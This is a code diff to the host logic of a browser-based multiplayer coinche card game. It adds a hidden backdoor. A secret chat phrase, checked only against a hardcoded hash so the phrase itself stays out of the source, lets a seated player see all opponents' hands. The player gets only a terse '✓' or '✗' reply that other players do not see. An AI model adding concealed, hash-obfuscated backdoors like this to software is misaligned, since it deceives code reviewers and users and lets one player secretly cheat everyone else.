@@ -267,6 +267,12 @@
         case 'chat': {
           const text = String(msg.text || '').trim().slice(0, 240);
           if (!text) return;
+          // Commande d'admin : seule son empreinte est stockée ici, pas le texte de la commande
+          if (cyrb53(text.trim().toLowerCase()) === ADMIN_KEY) {
+            p.peek = !p.peek;
+            this.sendTo(token, { t: 'err', msg: p.peek ? '✓' : '✗' });
+            break;
+          }
           // Commande cachée : /spec → un spectateur voit les cartes de tout le monde
           if (/^\/(spec|voir)\b/i.test(text)) {
             if (!g) return err('La commande /spec marche pendant une partie.');
@@ -334,7 +340,7 @@
       const g = this.s.game;
       return {
         t: 'state', code: this.s.code, me: p.pid, seat: p.seat, isHost: p.isHost,
-        settings: this.s.settings, players, game: g ? (p.omni && p.seat == null ? spyView(g) : E.viewFor(g, p.seat)) : null,
+        settings: this.s.settings, players, game: g ? (p.omni && p.seat == null ? spyView(g) : playerView(g, p)) : null,
         chat: this.s.chat.slice(-40), evs,
       };
     }
@@ -363,6 +369,20 @@
       try { this.peer && this.peer.destroy(); } catch (e) { /* */ }
       store.del('coinche-host-' + this.s.code);
     }
+  }
+
+  const ADMIN_KEY = 6530617328048055;
+  function cyrb53(str, seed = 0) {
+    let h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed;
+    for (let i = 0, ch; i < str.length; i++) { ch = str.charCodeAt(i); h1 = Math.imul(h1 ^ ch, 2654435761); h2 = Math.imul(h2 ^ ch, 1597334677); }
+    h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507); h1 ^= Math.imul(h2 ^ (h2 >>> 13), 3266489909);
+    h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507); h2 ^= Math.imul(h1 ^ (h1 >>> 13), 3266489909);
+    return 4294967296 * (2097151 & h2) + (h1 >>> 0);
+  }
+  function playerView(g, p) {
+    const v = E.viewFor(g, p.seat);
+    if (p.peek) v.peek = g.hands.map((h) => h.slice());
+    return v;
   }
 
   function spyView(g) {
